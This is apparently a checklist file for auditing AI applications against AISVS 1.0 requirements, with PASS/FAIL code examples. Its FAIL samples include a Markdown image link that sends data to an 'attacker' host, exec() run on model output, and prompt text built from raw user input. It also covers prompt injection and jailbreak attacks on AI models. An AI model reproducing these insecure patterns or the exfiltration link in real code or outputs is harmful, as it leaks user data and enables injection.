# AISVS 1.0: C2, C5, C7, C12

Load when: Always when AISVS applies (any LLM/ML feature)
Total: 57 requirements (L1: 17, L2: 28, L3: 12). Levels are cumulative: an L2 assessment checks every row marked 1 or 2.
Requirement text is verbatim from the locked AISVS v1.0 source (1.0/en) with the leading "Verify that" removed. Cite IDs as v1.0-<id> (C2.1.3 -> v1.0-C2.1.3).
Look up one row: `grep -F "| C2.1.1 |" references/<this file>`

## Contents

- [C2 Input Validation (12 reqs, 7 at L1)](#c2-input-validation-12-reqs-7-at-l1)
- [C5 Access Control & Identity for AI Components & Users (11 reqs, 0 at L1)](#c5-access-control-identity-for-ai-components-users-11-reqs-0-at-l1)
- [C7 Model Behavior, Output Control & Safety Assurance (13 reqs, 5 at L1)](#c7-model-behavior-output-control-safety-assurance-13-reqs-5-at-l1)
- [C12 Monitoring, Logging & Anomaly Detection (21 reqs, 5 at L1)](#c12-monitoring-logging-anomaly-detection-21-reqs-5-at-l1)
- [Key PASS/FAIL Patterns](#key-passfail-patterns)

---

## C2 Input Validation (12 reqs, 7 at L1)

### C2.1 Prompt Injection Defenses

| ID | L | Requirement |
|---|---|---|
| C2.1.1 | 1 | Input normalization is applied before tokenization or embedding. |
| C2.1.2 | 1 | Encoding and representation smuggling in inputs is detected and mitigated. Approved mitigations include canonicalization, strict schema validation, policy-based rejection, or explicit marking. |
| C2.1.3 | 1 | All inputs that could steer model behavior are treated as untrusted and screened by a prompt injection detection ruleset or classifier, with flagged inputs blocked. |
| C2.1.4 | 1 | Input length controls prevent content from exceeding the context window. The controls must reject inputs that exceed token limits rather than truncating them. |
| C2.1.5 | 1 | The system implements a character set restriction for all inputs. The restriction must use an allow-list approach that permits only characters that are explicitly required. |
| C2.1.6 | 2 | The system enforces an instruction hierarchy in which system and developer messages override user instructions and other untrusted inputs, even after user instructions have been processed. |
| C2.1.7 | 2 | Reserved special tokens are encoded as literal characters and cannot be injected into the model context. |
| C2.1.8 | 3 | The system can detect many-shot jailbreaking patterns. |

### C2.2 Content & Policy Screening

| ID | L | Requirement |
|---|---|---|
| C2.2.1 | 1 | Every prompt is scored by a content classifier for violence, self-harm, hate, and sexual content against configurable thresholds. Prompts that exceed those thresholds are rejected or sanitized before reaching the model context. |
| C2.2.2 | 1 | Prompt content classification is evaluated for unsupported languages. |
| C2.2.3 | 2 | Non-text inputs (image/video/audio) are checked for adversarial perturbations, steganographic payloads, hidden or embedded content, or known attack patterns. |
| C2.2.4 | 3 | Coordinated attacks spanning multiple input types (e.g., steganographic payloads in images combined with prompt injection in text) are detected and blocked. |

---

## C5 Access Control & Identity for AI Components & Users (11 reqs, 0 at L1)

### C5.1 Authentication

| ID | L | Requirement |
|---|---|---|
| C5.1.1 | 3 | High-risk AI operations (model deployment, weight export, training data access, production configuration changes) require step-up authentication. |
| C5.1.2 | 3 | AI agents in federated or multi-system deployments authenticate using short-lived, minimal-scoped, cryptographically signed tokens. |

### C5.2 AI Resource Authorization & Classification

| ID | L | Requirement |
|---|---|---|
| C5.2.1 | 2 | Every AI resource (datasets, endpoints, vector collections, embedding indices, compute instances) enforces access controls with explicit allow-lists and default-deny policies. |
| C5.2.2 | 2 | Retrieval pipelines (e.g., RAG queries, embedding lookups) enforce the end-user's authorization context at each retrieval and assembly stage, rather than relying solely on the service account's permissions. |
| C5.2.3 | 2 | Sensitive data is retrieved via retrieval pipelines (e.g., RAG queries, embedding lookups) to prevent permanent storage in models. |
| C5.2.4 | 2 | Post-inference filtering mechanisms prevent responses from including data that the requester is not authorized to receive. |
| C5.2.5 | 2 | The policy decision point for agent authorization is isolated from the agent's execution environment. |
| C5.2.6 | 3 | Privileged access to model weights, training pipelines, and production AI configuration is granted just in time, with a defined maximum session duration and automatic expiry. Zero Standing Privilege (ZSP) to these resources is encouraged. |
| C5.2.7 | 3 | Data classification labels propagate to downstream resources (embeddings, prompt caches, model outputs). |

### C5.3 Multi-Tenant Isolation

| ID | L | Requirement |
|---|---|---|
| C5.3.1 | 2 | Shared model serving infrastructure prevents one tenant's fine-tuning, inference, or embedding operations from influencing or observing another tenant's operations. |
| C5.3.2 | 3 | One tenant cannot influence or observe another tenant's operations through shared compute resources. Satisfying this requirement typically requires hardware partitioning, confidential computing, or dedicated per-tenant compute allocation. |

---

## C7 Model Behavior, Output Control & Safety Assurance (13 reqs, 5 at L1)

### C7.1 Output Format Enforcement

| ID | L | Requirement |
|---|---|---|
| C7.1.1 | 1 | The application validates all model outputs against a defined schema and rejects any output that does not match. |
| C7.1.2 | 1 | Model-generated output is bounded by length limits and termination controls. |

### C7.2 Hallucination Detection & Mitigation

| ID | L | Requirement |
|---|---|---|
| C7.2.1 | 2 | The system assesses the reliability of generated answers using a confidence estimation method. |
| C7.2.2 | 2 | The application automatically blocks answers or switches to a fallback message if the confidence score drops below a defined threshold. |
| C7.2.3 | 3 | For responses classified as high-risk by policy, the system performs an additional verification step. |

### C7.3 Output Safety

| ID | L | Requirement |
|---|---|---|
| C7.3.1 | 1 | Automated classifiers scan every response and block content that matches defined harmful content categories. |
| C7.3.2 | 2 | Output filters detect and block responses that disclose system prompt content or backend data. |
| C7.3.3 | 2 | Model-generated output is prevented from triggering outbound requests. |
| C7.3.4 | 3 | Model outputs are checked for hidden, encoded, or misleading content created through homoglyphs, formatting, metadata, or structured fields. |

### C7.4 Source Attribution & Citation Integrity

| ID | L | Requirement |
|---|---|---|
| C7.4.1 | 1 | Responses generated using retrieval-augmented generation (RAG) include attribution to the source documents. |
| C7.4.2 | 1 | RAG attributions are derived from retrieval metadata and are not generated by the model, so provenance cannot be fabricated. |
| C7.4.3 | 2 | Claims in a RAG response can be traced to the retrieved chunk. |
| C7.4.4 | 3 | Generated media is watermarked to prove it was AI-generated. |

---

## C12 Monitoring, Logging & Anomaly Detection (21 reqs, 5 at L1)

### C12.1 Request & Response Logging

| ID | L | Requirement |
|---|---|---|
| C12.1.1 | 1 | AI interactions are logged with session context and AI-specific telemetry. |
| C12.1.2 | 2 | Safety filtering and policy decisions are logged with sufficient detail to support audit, debugging, and forensic analysis of content moderation systems. |
| C12.1.3 | 2 | Log entries for AI inference events follow a structured, interoperable schema that includes at least the model identifier, token usage (input and output), provider name, and operation type. |
| C12.1.4 | 2 | RAG pipeline retrieval events are logged, including the query, documents retrieved, and knowledge source. |

### C12.2 Detection and Alerting

| ID | L | Requirement |
|---|---|---|
| C12.2.1 | 1 | The system detects and alerts on known jailbreak patterns, prompt injection attempts, and adversarial inputs. |
| C12.2.2 | 2 | Behavioral anomaly detection identifies unusual conversation patterns, excessive retry attempts, or probing behaviors. |
| C12.2.3 | 2 | Custom rules detect AI-specific threat patterns for coordinated jailbreak attempts, prompt injection, and system prompt extraction attempts. |
| C12.2.4 | 2 | Extraction-alert events include offending query metadata to support investigation. |
| C12.2.5 | 2 | Token usage is tracked at granular attribution levels including per user, per session, per feature endpoint, and per team or workspace. |
| C12.2.6 | 3 | LLM API traffic is monitored for covert-channel indicators and communication signatures to identify malware and command-and-control (C2) activity. |

### C12.3 Model, Data, and Performance Drift Detection

| ID | L | Requirement |
|---|---|---|
| C12.3.1 | 1 | Data drift detection monitors input distribution changes that may impact model performance, using statistically validated methods matched to the input data type (e.g., KS test or PSI for tabular numeric features, embedding-distance metrics for text or image). |
| C12.3.2 | 2 | Hallucination detection monitors identify and flag model outputs that contain factually incorrect, inconsistent, or fabricated information. |
| C12.3.3 | 2 | Hallucination rates are tracked as continuous time-series metrics to enable trend analysis and detection of sustained model degradation. |
| C12.3.4 | 3 | Unexplained behavioral shifts are distinguished from gradual, expected operational drift. |

### C12.4 Proactive Security Behavior Monitoring

| ID | L | Requirement |
|---|---|---|
| C12.4.1 | 2 | Autonomous action triggers include proactive behavior-pattern analysis, security evaluation, and threat-landscape assessment. |
| C12.4.2 | 2 | Audit logs capture security-critical proactive actions, including approver identity, timestamp, action parameters, and decision outcomes. |
| C12.4.3 | 2 | Kill-switch activations and override commands are logged. |

### C12.5 Training Data & Model Lifecycle Audit

| ID | L | Requirement |
|---|---|---|
| C12.5.1 | 1 | Dataset lineage records each dataset and its components, including all transformations, augmentations, and merges. |
| C12.5.2 | 1 | All labeling activities are recorded in logs. |
| C12.5.3 | 2 | All model changes generate immutable audit records. |
| C12.5.4 | 2 | Every ingested document is tagged at write time with source, writer identity, and timestamp. |

---

## Key PASS/FAIL Patterns

### C2.1.3 / C2.1.6 Prompt injection: untrusted input and instruction hierarchy

FAIL (user text spliced into the instruction channel):
```python
prompt = f"You are a support bot. Never reveal internal data. User says: {user_input}"
client.chat.completions.create(model=M, messages=[{"role": "user", "content": prompt}])
```

PARTIAL (roles separated, which supports C2.1.6, but nothing screens the input, so C2.1.3 still fails):
```python
client.chat.completions.create(model=M, messages=[
    {"role": "system", "content": SYSTEM_PROMPT},
    {"role": "user", "content": user_input},
])
```

PASS for C2.1.3 needs a detector or classifier whose verdict blocks the request, e.g. a guardrail call before the model call whose result is enforced, not just logged.

### C2.1.4 Length limits reject, not truncate

FAIL: `user_input[:4000]` (silent truncation). PASS: count tokens and return an error when over the limit.

### C7.1.1 Output schema validation (also ASVS V1.3.2 when output is executed)

FAIL:
```python
code = llm.generate(prompt)
exec(code)                              # model output executed directly
data = json.loads(llm.generate(prompt)) # parsed but never validated
```

PASS:
```python
result = Answer.model_validate_json(llm.generate(prompt))  # pydantic schema, raises on mismatch
```

### C7.3.3 Output must not trigger outbound requests

FAIL: rendering model output as Markdown/HTML that includes `![x](https://attacker/?q=...)` images, or passing model-produced URLs to an HTTP client. PASS: strip or proxy external URLs in rendered output; allow-list fetch targets.

### C5.2.2 Retrieval enforces the end user's authorization

FAIL:
```python
docs = vectorstore.similarity_search(query, k=5)   # any user's documents
```

PASS:
```python
docs = vectorstore.similarity_search(query, k=5, filter={"tenant_id": user.tenant_id, "acl": {"$in": user.groups}})
```

### C12.1.1 / C12.2.5 Logging and token attribution

FAIL: model calls with no log entry, or usage not attributed to a user/session.
PASS: each call logs model ID, session, user, and `response.usage` token counts (redact prompt PII per ASVS V16.2.5).

### Cross-references for topics with no dedicated AISVS 1.0 chapter

- Privacy: data minimisation C1.1.1, label redaction C1.2.3, masking before embedding C8.2.1, membership inference and differential privacy C11.2. Also apply ASVS V14.
- Human oversight: approval gates C9.2, kill switches C9.6.1 and C12.4.3.
- AI provider API keys in client-side code: no AISVS row; report under ASVS secrets management (V13.3) and C9.5.4 when the key reaches model context.
